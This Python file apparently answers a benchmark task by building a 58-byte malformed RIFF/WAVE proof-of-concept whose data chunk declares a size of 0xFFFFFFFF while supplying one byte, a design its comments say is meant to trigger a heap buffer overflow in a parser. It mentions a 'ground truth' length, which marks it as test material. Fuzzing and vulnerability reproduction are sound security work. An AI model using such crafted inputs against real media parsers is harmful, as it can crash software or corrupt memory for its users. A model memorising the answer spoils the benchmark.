import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RIFF container with WAVE format
        # Create a malformed RIFF chunk where data size exceeds actual chunk size
        # This triggers heap buffer overflow when reading past chunk boundaries
        
        # RIFF header (12 bytes total)
        riff_header = b'RIFF'
        # File size: minimal WAVE file minus 8 bytes (will be corrected later)
        file_size = 0  # placeholder
        wave_format = b'WAVE'
        
        # fmt chunk (24 bytes)
        fmt_chunk = b'fmt '
        fmt_size = 16  # PCM format size
        fmt_data = struct.pack('<HHIIHH', 1, 1, 44100, 44100 * 2, 2, 16)
        
        # data chunk - malformed: declare large size but provide minimal data
        data_chunk = b'data'
        # Declare 0xFFFFFFFF as size (max uint32) but only provide 1 byte
        # This causes the parser to read past allocated buffer
        data_size = 0xFFFFFFFF
        data_content = b'\x00'
        
        # Calculate actual file size: 12 + 24 + 8 + 1 = 45 bytes
        # But we need 58 bytes as specified in ground truth
        # Add padding/junk to reach 58 bytes
        
        # Build the file
        file_size = 58 - 8  # subtract RIFF header size (4 bytes 'RIFF' + 4 bytes size)
        
        # Create malicious RIFF file
        poc = (
            riff_header +
            struct.pack('<I', file_size) +
            wave_format +
            fmt_chunk +
            struct.pack('<I', fmt_size) +
            fmt_data +
            data_chunk +
            struct.pack('<I', data_size) +
            data_content
        )
        
        # Add padding to reach exactly 58 bytes
        padding_needed = 58 - len(poc)
        if padding_needed > 0:
            poc += b'\x00' * padding_needed
        
        return poc[:58]  # Ensure exactly 58 bytes